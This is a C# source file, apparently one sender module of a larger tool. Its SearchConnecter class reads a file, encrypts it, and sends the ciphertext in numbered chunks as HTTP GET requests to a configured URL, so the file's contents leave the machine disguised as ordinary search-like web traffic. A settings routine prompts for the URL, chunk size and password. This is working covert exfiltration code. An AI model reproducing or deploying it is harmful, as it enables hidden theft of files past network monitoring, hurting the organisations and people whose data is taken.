using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using CORE;
using xNet;

namespace Connecter2.Sending
{
    class SearchConnecter:IConnecter
    {
        private static string _n = "searchSend";
        private string url;
        private int kol;
        public SearchConnecter()
        {
            url = sys.setting.Get(_n, "iurl");
            kol = int.Parse(sys.setting.Get(_n, "isymbol"));
        }
        public void send(string filename)
        {
            string str = System.IO.File.ReadAllText(filename);
            string pass = sys.setting.Get(_n, "ipass");
            DP_SCH_LIB.Crypt cr = new DP_SCH_LIB.Crypt(pass);
            str = cr.Enc(str);
            HttpRequest Http = new HttpRequest();
            int i = 0;
            while (i < str.Length)
            {
                string tmp = "part"+i.ToString()+"-";
                if ((i + kol) > str.Length)
                {
                    tmp += str.Substring(i);
                }
                else
                {
                    tmp +=str.Substring(i, this.kol);
                }
                Http.Get(url+tmp);
                i += kol;
                sys.writeln(url+tmp);
            }
        }
        public static void SetSetting()
        {
            sys.write(sys.lang.Get(_n, "iurl"));
            sys.setting.Add(_n, "iurl", sys.read());
            sys.write(sys.lang.Get(_n, "isymbol"));
            sys.setting.Add(_n, "isymbol", sys.read());
            sys.write(sys.lang.Get(_n, "ipass"));
            sys.setting.Add(_n, "ipass", sys.read());
        }
    }
}
